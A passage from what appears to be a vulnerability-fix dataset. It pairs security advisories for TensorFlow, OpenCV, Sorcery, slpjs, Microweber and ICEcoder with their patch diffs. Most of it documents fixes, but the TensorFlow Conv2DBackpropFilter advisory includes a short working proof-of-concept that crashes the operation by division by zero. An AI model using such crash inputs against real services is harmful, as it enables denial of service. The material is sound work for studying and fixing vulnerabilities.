[f09caa532b6e1ac8d2aa61b7832c78c5b79300c6](https:\/\/github.com\/tensorflow\/tensorflow\/commit\/f09caa532b6e1ac8d2aa61b7832c78c5b79300c6).\n\nThe fix will be included in TensorFlow 2.7.0. We will also cherrypick this commit on TensorFlow 2.6.1, TensorFlow 2.5.2, and TensorFlow 2.4.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/master\/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.","published_date":"2021-11-10","chain_len":1,"project":"https:\/\/github.com\/tensorflow\/tensorflow","commit_href":"https:\/\/github.com\/tensorflow\/tensorflow\/commit\/f09caa532b6e1ac8d2aa61b7832c78c5b79300c6","commit_sha":"f09caa532b6e1ac8d2aa61b7832c78c5b79300c6","patch":"SINGLE","chain_ord":"['f09caa532b6e1ac8d2aa61b7832c78c5b79300c6']","before_first_fix_commit":"{'a81f78d35ecabae6ba61c1a65279bcb5ff9c7d95'}","last_fix_commit":"f09caa532b6e1ac8d2aa61b7832c78c5b79300c6","chain_ord_pos":1.0,"commit_datetime":"08\/19\/2021, 16:05:04","message":"Fix EinsumHelper::ParseEquation to avoid uninitialized accesses.\n\nEinsumHelper::ParseEquation is supposed to return true or false in\ninput_has_ellipsis and output_has_ellipsis to indicate whether there is\nellipsis in the inputs and output. Previously, when there is no ellipsis in the\ninputs or output, the routine doesn't assign false to the variables. This\nchange initializes the two variables with false to fix the problem.\nPiperOrigin-RevId: 391772004\nChange-Id: I17b6c88aadef4131470378e48cced054bf252e86","author":"Bixia Zheng","comments":null,"stats":"{'additions': 2, 'deletions': 0, 'total': 2}","files":"{'tensorflow\/core\/kernels\/linalg\/einsum_op_impl.h': {'additions': 2, 'deletions': 0, 'changes': 2, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/tensorflow\/tensorflow\/raw\/f09caa532b6e1ac8d2aa61b7832c78c5b79300c6\/tensorflow%2Fcore%2Fkernels%2Flinalg%2Feinsum_op_impl.h', 'patch': '@@ -153,6 +153,7 @@ struct EinsumHelper {\\n     input_has_ellipsis->resize(num_inputs);\\n     for (int i = 0; i < num_inputs; ++i) {\\n       input_label_counts->at(i).resize(num_labels);\\n+      input_has_ellipsis->at(i) = false;\\n       for (const int label : input_labels->at(i)) {\\n         if (label != kEllipsisLabel)\\n           input_label_counts->at(i)[label] += 1;\\n@@ -161,6 +162,7 @@ struct EinsumHelper {\\n       }\\n     }\\n     output_label_counts->resize(num_labels);\\n+    *output_has_ellipsis = false;\\n     for (const int label : *output_labels) {\\n       if (label != kEllipsisLabel)\\n         output_label_counts->at(label) += 1;'}}","message_norm":"fix einsumhelper::parseequation to avoid uninitialized accesses.\n\neinsumhelper::parseequation is supposed to return true or false in\ninput_has_ellipsis and output_has_ellipsis to indicate whether there is\nellipsis in the inputs and output. previously, when there is no ellipsis in the\ninputs or output, the routine doesn't assign false to the variables. this\nchange initializes the two variables with false to fix the problem.\npiperorigin-revid: 391772004\nchange-id: i17b6c88aadef4131470378e48cced054bf252e86","language":"en","entities":"[('fix', 'ACTION', ''), ('uninitialized', 'SECWORD', ''), ('initializes', 'SECWORD', ''), ('fix', 'ACTION', ''), ('problem', 'FLAW', ''), ('391772004', 'SHA', 'generic_sha')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['tensorflow\/core\/kernels\/linalg\/einsum_op_impl.h'])","num_files":1.0},{"index":2219,"vuln_id":"GHSA-j8cx-j9j2-f29w","cwe_id":"{'CWE-922'}","score":0.0,"chain":"{'https:\/\/github.com\/microweber\/microweber\/commit\/b592c86d2b927c0cae5b73b87fb541f25e777aa3'}","dataset":"osv","summary":"Insecure Storage of Sensitive Information in Microweber Microweber prior to version 1.3 does not strip images of EXIF data, exposing information about users' locations, device hardware, and device software.","published_date":"2022-02-24","chain_len":1,"project":"https:\/\/github.com\/microweber\/microweber","commit_href":"https:\/\/github.com\/microweber\/microweber\/commit\/b592c86d2b927c0cae5b73b87fb541f25e777aa3","commit_sha":"b592c86d2b927c0cae5b73b87fb541f25e777aa3","patch":"SINGLE","chain_ord":"['b592c86d2b927c0cae5b73b87fb541f25e777aa3']","before_first_fix_commit":"{'bfb86241bbb8cffe8291822091c6411498ac2a3e'}","last_fix_commit":"b592c86d2b927c0cae5b73b87fb541f25e777aa3","chain_ord_pos":1.0,"commit_datetime":"02\/22\/2022, 11:07:12","message":"Update plupload.php","author":"Bozhidar Slaveykov","comments":null,"stats":"{'additions': 3, 'deletions': 3, 'total': 6}","files":"{'src\/MicroweberPackages\/App\/functions\/plupload.php': {'additions': 3, 'deletions': 3, 'changes': 6, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/microweber\/microweber\/raw\/b592c86d2b927c0cae5b73b87fb541f25e777aa3\/src%2FMicroweberPackages%2FApp%2Ffunctions%2Fplupload.php', 'patch': \"@@ -522,22 +522,22 @@\\n                 \/\/ This will clear exif data - security issue\\n                 $imgCreatedFromJpeg = @imagecreatefromjpeg($filePath);\\n                 if ($imgCreatedFromJpeg) {\\n-                    imagejpeg($imgCreatedFromJpeg, $filePath,100);\\n+                    imagejpeg($imgCreatedFromJpeg, $filePath,100);  \/\/ this will create fresh new image without exif sensitive data\\n                     $valid = true;\\n                 }\\n             } else if ($ext === 'png') {\\n \\n                 $imgCreatedFromPng = @imagecreatefrompng($filePath);\\n                 if ($imgCreatedFromPng) {\\n-                    imagepng($imgCreatedFromPng, $filePath,100);\\n+                    imagepng($imgCreatedFromPng, $filePath,100);  \/\/ this will create fresh new image without exif sensitive data\\n                     $valid = true;\\n                 }\\n \\n             } else if ($ext === 'gif') {\\n \\n                 $imgCreatedFromGif = @imagecreatefromgif($filePath);\\n                 if ($imgCreatedFromGif) {\\n-                    imagegif($imgCreatedFromGif, $filePath,100);\\n+                    imagegif($imgCreatedFromGif, $filePath,100); \/\/ this will create fresh new image without exif sensitive data\\n                     $valid = true;\\n                 }\"}}","message_norm":"update plupload.php","language":"ro","entities":"[('update', 'ACTION', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['src\/MicroweberPackages\/App\/functions\/plupload.php'])","num_files":1.0},{"index":2221,"vuln_id":"GHSA-j8qc-5fqr-52fp","cwe_id":"{'CWE-369'}","score":2.5,"chain":"{'https:\/\/github.com\/tensorflow\/tensorflow\/commit\/c570e2ecfc822941335ad48f6e10df4e21f11c96'}","dataset":"osv","summary":"Division by zero in `Conv2DBackpropFilter` ### Impact\nAn attacker can cause a division by zero to occur in `Conv2DBackpropFilter`:\n\n```python\nimport tensorflow as tf\n\ninput_tensor = tf.constant([], shape=[0, 0, 0, 0], dtype=tf.float32)\nfilter_sizes = tf.constant([0, 0, 0, 0], shape=[4], dtype=tf.int32)\nout_backprop = tf.constant([], shape=[0, 0, 0, 0], dtype=tf.float32)\n\ntf.raw_ops.Conv2DBackpropFilter(\n  input=input_tensor,\n  filter_sizes=filter_sizes,\n  out_backprop=out_backprop,\n  strides=[1, 1, 1, 1],\n  use_cudnn_on_gpu=False,\n  padding='SAME',\n  explicit_paddings=[],\n  data_format='NHWC',\n  dilations=[1, 1, 1, 1]\n)\n```\n\nThis is because the [implementation](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/1b0296c3b8dd9bd948f924aa8cd62f87dbb7c3da\/tensorflow\/core\/kernels\/conv_grad_filter_ops.cc#L513-L522) computes a divisor based on user provided data (i.e., the shape of the tensors given as arguments):\n\n```cc\nconst size_t size_A = output_image_size * filter_total_size; \nconst size_t size_B = output_image_size * dims.out_depth;\nconst size_t size_C = filter_total_size * dims.out_depth;\nconst size_t work_unit_size = size_A + size_B + size_C;\nconst size_t shard_size = (target_working_set_size + work_unit_size - 1) \/ work_unit_size;\n```\n\nIf all shapes are empty then `work_unit_size` is 0. Since there is no check for this case before division, this results in a runtime exception, with potential to be abused for a denial of service. \n\n### Patches\nWe have patched the issue in GitHub commit [c570e2ecfc822941335ad48f6e10df4e21f11c96](https:\/\/github.com\/tensorflow\/tensorflow\/commit\/c570e2ecfc822941335ad48f6e10df4e21f11c96).\n\nThe fix will be included in TensorFlow 2.5.0. We will also cherrypick this commit on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow 2.1.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/master\/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n  \n### Attribution\nThis vulnerability has been reported by Yakun Zhang and Ying Wang of Baidu X-Team.","published_date":"2021-05-21","chain_len":1,"project":"https:\/\/github.com\/tensorflow\/tensorflow","commit_href":"https:\/\/github.com\/tensorflow\/tensorflow\/commit\/c570e2ecfc822941335ad48f6e10df4e21f11c96","commit_sha":"c570e2ecfc822941335ad48f6e10df4e21f11c96","patch":"SINGLE","chain_ord":"['c570e2ecfc822941335ad48f6e10df4e21f11c96']","before_first_fix_commit":"{'1b0296c3b8dd9bd948f924aa8cd62f87dbb7c3da'}","last_fix_commit":"c570e2ecfc822941335ad48f6e10df4e21f11c96","chain_ord_pos":1.0,"commit_datetime":"04\/22\/2021, 00:50:10","message":"Fix issues in Conv2DBackpropFilter.\n\nPiperOrigin-RevId: 369772454\nChange-Id: I49b465f2ae2ce91def61b56cea8000197d5177d8","author":"Mihai Maruseac","comments":null,"stats":"{'additions': 13, 'deletions': 0, 'total': 13}","files":"{'tensorflow\/core\/kernels\/conv_grad_filter_ops.cc': {'additions': 13, 'deletions': 0, 'changes': 13, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/tensorflow\/tensorflow\/raw\/c570e2ecfc822941335ad48f6e10df4e21f11c96\/tensorflow%2Fcore%2Fkernels%2Fconv_grad_filter_ops.cc', 'patch': '@@ -495,6 +495,14 @@ class Conv2DCustomBackpropFilterOp : public OpKernel {\\n     const int filter_total_size = dims.spatial_dims[0].filter_size *\\n                                   dims.spatial_dims[1].filter_size *\\n                                   dims.in_depth;\\n+    OP_REQUIRES(\\n+        context,\\n+        filter_total_size * dims.out_depth == filter_backprop->NumElements(),\\n+        errors::InvalidArgument(\\n+            \"filter_size does not have enough elements, requested \",\\n+            filter_total_size * dims.out_depth, \", got \",\\n+            filter_backprop->NumElements()));\\n+\\n     \/\/ The output image size is the spatial size of the output.\\n     const int output_image_size =\\n         dims.spatial_dims[0].output_size * dims.spatial_dims[1].output_size;\\n@@ -518,6 +526,11 @@ class Conv2DCustomBackpropFilterOp : public OpKernel {\\n \\n     const size_t work_unit_size = size_A + size_B + size_C;\\n \\n+    OP_REQUIRES(\\n+        context, work_unit_size != 0,\\n+        errors::InvalidArgument(\\n+            \"Work size for convolution would be 0, which is not acceptable\"));\\n+\\n     const size_t shard_size =\\n         (target_working_set_size + work_unit_size - 1) \/ work_unit_size;'}}","message_norm":"fix issues in conv2dbackpropfilter.\n\npiperorigin-revid: 369772454\nchange-id: i49b465f2ae2ce91def61b56cea8000197d5177d8","language":"en","entities":"[('fix', 'ACTION', ''), ('issues', 'FLAW', ''), ('369772454', 'SHA', 'generic_sha')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['tensorflow\/core\/kernels\/conv_grad_filter_ops.cc'])","num_files":1.0},{"index":2222,"vuln_id":"GHSA-j8qh-3xrq-c825","cwe_id":"{'CWE-369'}","score":2.5,"chain":"{'https:\/\/github.com\/tensorflow\/tensorflow\/commit\/3ebedd7e345453d68e279cfc3e4072648e5e12e5'}","dataset":"osv","summary":"Division by zero in TFLite's implementation of `OneHot` ### Impact\nThe implementation of the `OneHot` TFLite operator is [vulnerable to a division by zero error](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/f61c57bd425878be108ec787f4d96390579fb83e\/tensorflow\/lite\/kernels\/one_hot.cc#L68-L72):\n\n```cc\nint prefix_dim_size = 1;\nfor (int i = 0; i < op_context.axis; ++i) {\n  prefix_dim_size *= op_context.indices->dims->data[i];\n}\nconst int suffix_dim_size = NumElements(op_context.indices) \/ prefix_dim_size;\n```\n\nAn attacker can craft a model such that at least one of the dimensions of `indices` would be 0. In turn, the `prefix_dim_size` value would become 0.\n\n### Patches\nWe have patched the issue in GitHub commit [3ebedd7e345453d68e279cfc3e4072648e5e12e5](https:\/\/github.com\/tensorflow\/tensorflow\/commit\/3ebedd7e345453d68e279cfc3e4072648e5e12e5).\n\nThe fix will be included in TensorFlow 2.5.0. We will also cherrypick this commit on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow 2.1.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/master\/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by members of the Aivul Team from Qihoo 360.","published_date":"2021-05-21","chain_len":1,"project":"https:\/\/github.com\/tensorflow\/tensorflow","commit_href":"https:\/\/github.com\/tensorflow\/tensorflow\/commit\/3ebedd7e345453d68e279cfc3e4072648e5e12e5","commit_sha":"3ebedd7e345453d68e279cfc3e4072648e5e12e5","patch":"SINGLE","chain_ord":"['3ebedd7e345453d68e279cfc3e4072648e5e12e5']","before_first_fix_commit":"{'f61c57bd425878be108ec787f4d96390579fb83e'}","last_fix_commit":"3ebedd7e345453d68e279cfc3e4072648e5e12e5","chain_ord_pos":1.0,"commit_datetime":"04\/28\/2021, 19:58:07","message":"Prevent division by 0 in OneHot implementation\n\nIf input indices is degenerate, the implementation would do a divide by zero. See https:\/\/github.com\/tensorflow\/tensorflow\/blob\/745d57df6d5e9bc568666a2a48ed8dd629c27241\/tensorflow\/lite\/kernels\/one_hot.cc#L68-L72\n\nPiperOrigin-RevId: 370966870\nChange-Id: Ie018337811c8016b5a1d3a277d00d5f2e19a2058","author":"Mihai Maruseac","comments":null,"stats":"{'additions': 5, 'deletions': 0, 'total': 5}","files":"{'tensorflow\/lite\/kernels\/one_hot.cc': {'additions': 5, 'deletions': 0, 'changes': 5, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/tensorflow\/tensorflow\/raw\/3ebedd7e345453d68e279cfc3e4072648e5e12e5\/tensorflow%2Flite%2Fkernels%2Fone_hot.cc', 'patch': '@@ -69,6 +69,11 @@ void OneHotComputeImpl(const OneHotContext& op_context) {\\n   for (int i = 0; i < op_context.axis; ++i) {\\n     prefix_dim_size *= op_context.indices->dims->data[i];\\n   }\\n+  if (prefix_dim_size == 0) {\\n+    \/\/ If indices tensor is degenerate, return a degenerate tensor, just like\\n+    \/\/ TensorFlow does.\\n+    return;\\n+  }\\n   const int suffix_dim_size = NumElements(op_context.indices) \/ prefix_dim_size;\\n   const int depth = *op_context.depth->data.i32;'}}","message_norm":"prevent division by 0 in onehot implementation\n\nif input indices is degenerate, the implementation would do a divide by zero. see https:\/\/github.com\/tensorflow\/tensorflow\/blob\/745d57df6d5e9bc568666a2a48ed8dd629c27241\/tensorflow\/lite\/kernels\/one_hot.cc#l68-l72\n\npiperorigin-revid: 370966870\nchange-id: ie018337811c8016b5a1d3a277d00d5f2e19a2058","language":"en","entities":"[('prevent', 'ACTION', ''), ('division by 0', 'SECWORD', ''), ('divide by zero', 'SECWORD', ''), ('https:\/\/github.com\/tensorflow\/tensorflow\/blob\/745d57df6d5e9bc568666a2a48ed8dd629c27241\/tensorflow\/lite\/kernels\/one_hot.cc#l68-l72', 'URL', ''), ('370966870', 'SHA', 'generic_sha')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['tensorflow\/lite\/kernels\/one_hot.cc'])","num_files":1.0},{"index":2227,"vuln_id":"GHSA-jc83-cpf9-q7c6","cwe_id":"{'CWE-697'}","score":8.6,"chain":"{'https:\/\/github.com\/simpleledger\/slpjs\/commit\/3671be2ffb6d4cfa94c00c6dc8649d1ba1d75754'}","dataset":"osv","summary":"False-negative validation results in MINT transactions with invalid baton ### Impact\nUsers could experience false-negative validation outcomes for [MINT](https:\/\/github.com\/simpleledger\/slp-specifications\/blob\/master\/slp-token-type-1.md#mint---extended-minting-transaction) transaction operations.  A poorly implemented SLP wallet could allow spending of the affected tokens which would result in the destruction of a user's minting baton.\n\n### Patches\nnpm package [slpjs](https:\/\/www.npmjs.com\/package\/slpjs) has been patched and published as version 0.27.2.\n\n\n### Workarounds\nUpgrade to slpjs 0.27.2.\n\n### References\n* slpjs [commit](https:\/\/github.com\/simpleledger\/slpjs\/commit\/3671be2ffb6d4cfa94c00c6dc8649d1ba1d75754)\n\n### For more information\nIf you have any questions or comments about this advisory:\n* Open an issue in [slp-validate](https:\/\/github.com\/simpleledger\/slp-validate\/issues) or [slpjs](https:\/\/github.com\/simpleledger\/slpjs\/issues)","published_date":"2020-05-12","chain_len":1,"project":"https:\/\/github.com\/simpleledger\/slpjs","commit_href":"https:\/\/github.com\/simpleledger\/slpjs\/commit\/3671be2ffb6d4cfa94c00c6dc8649d1ba1d75754","commit_sha":"3671be2ffb6d4cfa94c00c6dc8649d1ba1d75754","patch":"SINGLE","chain_ord":"['3671be2ffb6d4cfa94c00c6dc8649d1ba1d75754']","before_first_fix_commit":"{'2653647c7b9ceb7a9c863f9f8b70a5d638634bf5'}","last_fix_commit":"3671be2ffb6d4cfa94c00c6dc8649d1ba1d75754","chain_ord_pos":1.0,"commit_datetime":"04\/29\/2020, 16:48:21","message":"fix false negative case for MINT transactions\n\nSee the newly added unit test case for this issue.\nCurrently there are 151 unit tests.","author":"James Cramer","comments":null,"stats":"{'additions': 10, 'deletions': 6, 'total': 16}","files":"{'lib\/localvalidator.ts': {'additions': 10, 'deletions': 6, 'changes': 16, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/simpleledger\/slpjs\/raw\/3671be2ffb6d4cfa94c00c6dc8649d1ba1d75754\/lib%2Flocalvalidator.ts', 'patch': '@@ -282,10 +282,10 @@ export class LocalValidator implements SlpValidator {\\n                     }\\n                 } catch (_) {}\\n             }\\n-            if (this.cachedValidations[txid].parents.length !== 1) {\\n+            if (this.cachedValidations[txid].parents.length < 1) {\\n                 this.cachedValidations[txid].validity = false;\\n                 this.cachedValidations[txid].waiting = false;\\n-                this.cachedValidations[txid].invalidReason = \"MINT transaction must have 1 valid baton parent.\";\\n+                this.cachedValidations[txid].invalidReason = \"MINT transaction must have at least 1 candidate baton parent input.\";\\n                 return this.cachedValidations[txid].validity!;\\n             }\\n         }\\n@@ -342,10 +342,14 @@ export class LocalValidator implements SlpValidator {\\n         \/\/ Set validity validation-cache for parents, and handle MINT condition with no valid input\\n         \/\/ we don\\'t need to check proper token id since we only added parents with same ID in above steps.\\n         const parentTxids = [...new Set(this.cachedValidations[txid].parents.map(p => p.txid))];\\n-        for (let i = 0; i < parentTxids.length; i++) {\\n-            const valid = await this.isValidSlpTxid(parentTxids[i]);\\n-            this.cachedValidations[txid].parents.filter(p => p.txid === parentTxids[i]).map(p => p.valid = valid);\\n-            if (this.cachedValidations[txid].details!.transactionType === SlpTransactionType.MINT && !valid) {\\n+        for (const id of parentTxids) {\\n+            const valid = await this.isValidSlpTxid(id);\\n+            this.cachedValidations[txid].parents.filter(p => p.txid === id).map(p => p.valid = valid);\\n+        }\\n+\\n+        \/\/ Check MINT for exactly 1 valid MINT baton\\n+        if (this.cachedValidations[txid].details!.transactionType === SlpTransactionType.MINT) {\\n+            if (this.cachedValidations[txid].parents.filter(p => p.valid && p.inputQty === null).length !== 1) {\\n                 this.cachedValidations[txid].validity = false;\\n                 this.cachedValidations[txid].waiting = false;\\n                 this.cachedValidations[txid].invalidReason = \"MINT transaction with invalid baton parent.\";'}}","message_norm":"fix false negative case for mint transactions\n\nsee the newly added unit test case for this issue.\ncurrently there are 151 unit tests.","language":"en","entities":"[('fix', 'ACTION', ''), ('added', 'ACTION', ''), ('issue', 'FLAW', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['lib\/localvalidator.ts'])","num_files":1.0},{"index":2229,"vuln_id":"GHSA-jc8m-cxhj-668x","cwe_id":"{'CWE-307'}","score":8.3,"chain":"{'https:\/\/github.com\/Sorcery\/sorcery\/commit\/0f116d223826895a73b12492f17486e5d54ab7a7'}","dataset":"osv","summary":"Improper Restriction of Excessive Authentication Attempts in Sorcery ### Impact\nBrute force vulnerability when using password authentication via Sorcery. The brute force protection submodule will prevent a brute force attack for the defined lockout period, but once expired protection will not be re-enabled until a user or malicious actor logs in successfully. This does not affect users that do not use the built-in brute force protection submodule, nor users that use permanent account lockout.\n\n### Patches\nPatched as of version `0.15.0`.\n\n### Workarounds\nCurrently no workarounds, other than monkey patching the authenticate method provided by Sorcery or upgrading to version `0.15.0`.","published_date":"2020-05-07","chain_len":1,"project":"https:\/\/github.com\/Sorcery\/sorcery","commit_href":"https:\/\/github.com\/Sorcery\/sorcery\/commit\/0f116d223826895a73b12492f17486e5d54ab7a7","commit_sha":"0f116d223826895a73b12492f17486e5d54ab7a7","patch":"SINGLE","chain_ord":"['0f116d223826895a73b12492f17486e5d54ab7a7']","before_first_fix_commit":"{'6b72ca36cf389804963e2553ccbb3da000518e51'}","last_fix_commit":"0f116d223826895a73b12492f17486e5d54ab7a7","chain_ord_pos":1.0,"commit_datetime":"05\/02\/2020, 20:56:58","message":"Fix brute force vuln due to callbacks not being ran (#235)\n\nThe authenticate method previously would return before callbacks executed if an\r\ninvalid password was provided, which causes the brute force protection to only\r\nwork for the first lockout period, and only resets after a successful login.\r\n\r\nFixes #231","author":"Josh Buker","comments":null,"stats":"{'additions': 4, 'deletions': 4, 'total': 8}","files":"{'lib\/sorcery\/model.rb': {'additions': 4, 'deletions': 4, 'changes': 8, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/Sorcery\/sorcery\/raw\/0f116d223826895a73b12492f17486e5d54ab7a7\/lib%2Fsorcery%2Fmodel.rb', 'patch': '@@ -102,10 +102,6 @@ def authenticate(*credentials, &block)\\n \\n         set_encryption_attributes\\n \\n-        unless user.valid_password?(credentials[1])\\n-          return authentication_response(user: user, failure: :invalid_password, &block)\\n-        end\\n-\\n         if user.respond_to?(:active_for_authentication?) && !user.active_for_authentication?\\n           return authentication_response(user: user, failure: :inactive, &block)\\n         end\\n@@ -118,6 +114,10 @@ def authenticate(*credentials, &block)\\n           end\\n         end\\n \\n+        unless user.valid_password?(credentials[1])\\n+          return authentication_response(user: user, failure: :invalid_password, &block)\\n+        end\\n+\\n         authentication_response(user: user, return_value: user, &block)\\n       end'}}","message_norm":"fix brute force vuln due to callbacks not being ran (#235)\n\nthe authenticate method previously would return before callbacks executed if an\r\ninvalid password was provided, which causes the brute force protection to only\r\nwork for the first lockout period, and only resets after a successful login.\r\n\r\nfixes #231","language":"en","entities":"[('fix', 'ACTION', ''), ('#235', 'ISSUE', ''), ('password', 'SECWORD', ''), ('protection', 'SECWORD', ''), ('login', 'SECWORD', ''), ('fixes', 'ACTION', ''), ('#231', 'ISSUE', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['lib\/sorcery\/model.rb'])","num_files":1.0},{"index":2233,"vuln_id":"GHSA-jcxv-2j3h-mg59","cwe_id":"{'CWE-119'}","score":6.5,"chain":"{'https:\/\/github.com\/opencv\/opencv\/pull\/10369\/commits\/7bbe1a53cfc097b82b1589f7915a2120de39274c'}","dataset":"osv","summary":"Improper Restriction of Operations within the Bounds of a Memory Buffer in OpenCV OpenCV 3.3.1 (corresponding with opencv-python and opencv-contrib-python 3.3.1.11) has a Buffer Overflow in the cv::PxMDecoder::readData function in grfmt_pxm.cpp, because an incorrect size value is used.","published_date":"2021-10-12","chain_len":1,"project":"https:\/\/github.com\/opencv\/opencv","commit_href":"https:\/\/github.com\/opencv\/opencv\/pull\/10369\/commits\/7bbe1a53cfc097b82b1589f7915a2120de39274c","commit_sha":"7bbe1a53cfc097b82b1589f7915a2120de39274c","patch":"SINGLE","chain_ord":"['7bbe1a53cfc097b82b1589f7915a2120de39274c']","before_first_fix_commit":"{'eecb64a97313bcc0221db20c9cd0636f1c27a6d8'}","last_fix_commit":"7bbe1a53cfc097b82b1589f7915a2120de39274c","chain_ord_pos":1.0,"commit_datetime":"12\/21\/2017, 01:10:24","message":"imgcodecs(pxm): fix memcpy size","author":"Alexander Alekhin","comments":null,"stats":"{'additions': 1, 'deletions': 1, 'total': 2}","files":"{'modules\/imgcodecs\/src\/grfmt_pxm.cpp': {'additions': 1, 'deletions': 1, 'changes': 2, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/opencv\/opencv\/raw\/7bbe1a53cfc097b82b1589f7915a2120de39274c\/modules%2Fimgcodecs%2Fsrc%2Fgrfmt_pxm.cpp', 'patch': '@@ -333,7 +333,7 @@ bool PxMDecoder::readData( Mat& img )\\n                         }\\n                     }\\n                     else\\n-                        memcpy( data, src, CV_ELEM_SIZE1(m_type)*m_width);\\n+                        memcpy(data, src, img.elemSize1()*m_width);\\n                 }\\n                 else\\n                 {'}}","message_norm":"imgcodecs(pxm): fix memcpy size","language":"ca","entities":"[('fix', 'ACTION', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['modules\/imgcodecs\/src\/grfmt_pxm.cpp'])","num_files":1.0},{"index":2237,"vuln_id":"GHSA-jf9v-q8vh-3fmc","cwe_id":"{'CWE-79'}","score":5.4,"chain":"{'https:\/\/github.com\/icecoder\/ICEcoder\/commit\/21d6ae0f2a3fce7d076ae430d48f5df56bd0f256'}","dataset":"osv","summary":"Cross-site scripting in ICEcoder In ICEcoder 8.0 allows, a reflected XSS vulnerability was identified in the multipe-results.php page due to insufficient sanitization of the _GET['replace'] variable. As a result, arbitrary Javascript code can get executed.","published_date":"2021-09-09","chain_len":1,"project":"https:\/\/github.com\/icecoder\/ICEcoder","commit_href":"https:\/\/github.com\/icecoder\/ICEcoder\/commit\/21d6ae0f2a3fce7d076ae430d48f5df56bd0f256","commit_sha":"21d6ae0f2a3fce7d076ae430d48f5df56bd0f256","patch":"SINGLE","chain_ord":"['21d6ae0f2a3fce7d076ae430d48f5df56bd0f256']","before_first_fix_commit":"{'54e4aff163d29edb13fe885219f82fca258c7e99'}","last_fix_commit":"21d6ae0f2a3fce7d076ae430d48f5df56bd0f256","chain_ord_pos":1.0,"commit_datetime":"06\/25\/2021, 20:22:25","message":"XSS and usage fixes on multiple-results.php","author":"mattpass","comments":null,"stats":"{'additions': 15, 'deletions': 12, 'total': 27}","files":"{'lib\/multiple-results.php': {'additions': 15, 'deletions': 12, 'changes': 27, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/icecoder\/ICEcoder\/raw\/21d6ae0f2a3fce7d076ae430d48f5df56bd0f256\/lib%2Fmultiple-results.php', 'patch': '@@ -1,4 +1,5 @@\\n <?php\\n+\/\/ TODO: The whole file needs a refactor and comments!\\n include \"headers.php\";\\n include \"settings.php\";\\n $t = $text[\\'multiple-results\\'];\\n@@ -101,16 +102,18 @@\\n             if (\\n                 \/\/ TODO: Find in filenames not working with regex, see all instances of findText and $findText below\\n                 true === haveMatch && -1 < targetURL.indexOf(\\'_perms\\')) {\\n-                if (-1 < userTarget.indexOf(\"selected\")) {\\n-                    for (let j = 0; j < parent.ICEcoder.selectedFiles.length; j++) {\\n-                        \/\/ TODO: This whole file needs comments - what does the below do?!\\n+                    if (-1 < userTarget.indexOf(\"selected\")) {\\n+                        for (let j = 0; j < parent.ICEcoder.selectedFiles.length; j++) {\\n                         if (\\n-                            0 === targetURL.replace(\/\\\\\/\/g, \"|\").indexOf(parent.ICEcoder.selectedFiles[j].replace(\/\\\\\/\/g, \"|\").replace(\/_perms\/g, \"\"))\\n+                            \/\/ If the pipe delimited targetURL starts with this pipe delimited, non _perms elem selectedFile\\n+                            0 === targetURL.replace(\/\\\\\/\/g, \"|\").indexOf(parent.ICEcoder.selectedFiles[j].replace(\/\\\\\/\/g, \"|\").replace(\/_perms\/g, \"\").toLowerCase())\\n                             && (\\n-                            targetURL.replace(\/\\\\|\/g, \"\/\").replace(\/_perms\/g, \"\") === parent.ICEcoder.selectedFiles[j].replace(\/\\\\|\/g, \"\/\").replace(\/_perms\/g, \"\")\\n+                            \/\/ If the slash delimited, non _perms elem matches the slasj delimited, non _perms elem\\n+                            targetURL.replace(\/\\\\|\/g, \"\/\").replace(\/_perms\/g, \"\") === parent.ICEcoder.selectedFiles[j].replace(\/\\\\|\/g, \"\/\").replace(\/_perms\/g, \"\").toLowerCase()\\n                             ||\\n+                            \/\/ Path length for targetURL is greater than path length for this selectedFile and targetURL char at selectedFiles length ends with a slash\\n                             (targetURL.replace(\/\\\\|\/g, \"\/\").split(\"\/\").length > parent.ICEcoder.selectedFiles[j].replace(\/\\\\|\/g, \"\/\").split(\"\/\").length && \"\/\" === targetURL.charAt(parent.ICEcoder.selectedFiles[j].length)))) {\\n-                            foundInSelected = true;\\n+                                foundInSelected = true;\\n                         }\\n                     }\\n                 }\\n@@ -124,8 +127,8 @@\\n                     \/\/ TODO: get this line working\\n                     resultsDisplay +=\\n                         targetURL.replace(\/\\\\|\/g, \"\/\").replace(\/_perms\/g, \"\").replace(\/<?php\\n-                            echo str_replace(\"\/\", \"\\\\\/\",strtolower($findText)); ?>\/g, \"<b>\" +\\n-                            findText.toLowerCase() + \"<\/b>\");\\n+                            echo str_replace(\"\/\", \"\\\\\/\",strtolower(preg_quote($findText))); ?>\/g, \"<b>\" +\\n+                            parent.ICEcoder.xssClean(findText).toLowerCase() + \"<\/b>\");\\n                         resultsDisplay += \\'<\/a><br>\\';\\n                     <?php if (false === isset($_GET[\\'replace\\'])) { ?>\\n                     resultsDisplay += \\'<div id=\"foundCount\\' + i +\\'\">\\' + spansArray[i].innerHTML + \\'<\/div>\\';\\n@@ -134,8 +137,8 @@\\n                     resultsDisplay +=\\n                         \\'<div id=\"foundCount\\' + i + 